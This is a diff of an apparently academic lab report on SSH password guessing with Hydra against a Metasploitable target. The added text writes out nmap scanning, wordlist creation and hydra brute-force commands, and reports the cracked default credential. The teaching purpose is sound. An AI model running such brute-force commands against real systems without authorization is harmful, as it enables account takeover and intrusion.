@@ -1,42 +1,64 @@
+# Experiment 9: Password Guessing with Hydra
 
-# Experiment 9: Controlled Password-Guessing Demonstration Using Hydra
+## 1. Objective
 
-## Aim
-To perform a controlled password-guessing demonstration using Hydra in an authorized lab environment.
+To perform a controlled brute-force password-guessing attack using **Hydra** against an SSH service and identify weak login credentials using username and password wordlists.
 
-## Theory
-Hydra, also known as THC-Hydra, is an open-source password-auditing tool available in Kali Linux. It is used to test authentication security of services such as SSH, FTP and web login services. It helps identify weak credentials in an authorized environment.
+## 2. Procedure
 
-## Tools Used
-- Kali Linux
-- THC-Hydra
-- Nmap
-- Metasploitable 2
-- SSH Service
+### Step 1: Identify the Target and Scan Its Services
 
-## Procedure
+Use Nmap on Kali Linux to scan the target machine and identify its open ports and running services. Perform service version detection to confirm that SSH is running on port 22.
 
-### Step 1 – Identify Target Services
-Nmap was used to scan the authorized lab target. The scan identified several open services, including SSH running on port 22.
+# Command:
+```bash
+nmap -sV <Target-IP>
+```
 
-![Nmap Service Scan](outputs/SAVE_20261115_174126.jpg)
+![Screenshot 1](outputs/ss1.png)
 
-### Step 2 – Perform Hydra Authentication Testing
-Hydra was used in the controlled lab environment to demonstrate SSH authentication testing. An initial connection error was observed during the attempt.
+### Step 2: Prepare Username and Password Wordlists
 
-![Hydra Authentication Attempt](outputs/SAVE_20261115_174122.jpg)
+Create a username wordlist named `users.txt` containing the target username. Then, create a password wordlist named `passwords.txt` containing commonly used passwords for testing.
 
-### Step 3 – Confirm the Result
-The final output showed a successful authentication result for the lab test account.
+# Commands:
+```bash
+echo "msfadmin" > users.txt
+```
 
-![Hydra Successful Result](outputs/SAVE_20261115_174118.jpg)
+```bash
+echo -e "123456\npassword\nmsfadmin\nroot\nadmin" > passwords.txt
+```
 
+Use Hydra to attempt SSH authentication using the prepared username and password wordlists.
 
-## Result
-The experiment demonstrated password auditing with Hydra and showed how weak credentials can affect SSH security in a controlled lab.
+# Command:
+```bash
+hydra -L users.txt -P passwords.txt ssh://<Target-IP>
+```
 
-## Conclusion
-We learned about Hydra, SSH authentication and the importance of using strong passwords. Such testing must only be performed on authorized systems.
+The initial attempt encountered an SSH MAC algorithm compatibility error between the client and server.
 
+![Screenshot 2](outputs/ss2.png)
 
+### Step 3: Resolve the SSH Compatibility Issue
 
+Open the SSH client configuration file in Kali Linux to address the compatibility issue encountered during the initial attempt.
+
+# Command:
+```bash
+sudo nano /etc/ssh/ssh_config
+```
+
+Save the required configuration changes and retry the Hydra attack using the specified username and password wordlist.
+
+# Command:
+```bash
+hydra -l msfadmin -P passwords.txt -t 4 ssh://<Target-IP>
+```
+
+![Screenshot 3](outputs/ss3.png)
+
+## 3. Result
+
+The experiment demonstrated password guessing using **Hydra** against an SSH service in a controlled laboratory environment. Hydra successfully identified valid SSH credentials (`msfadmin:msfadmin`) from the prepared password wordlist, demonstrating the risks associated with weak passwords.
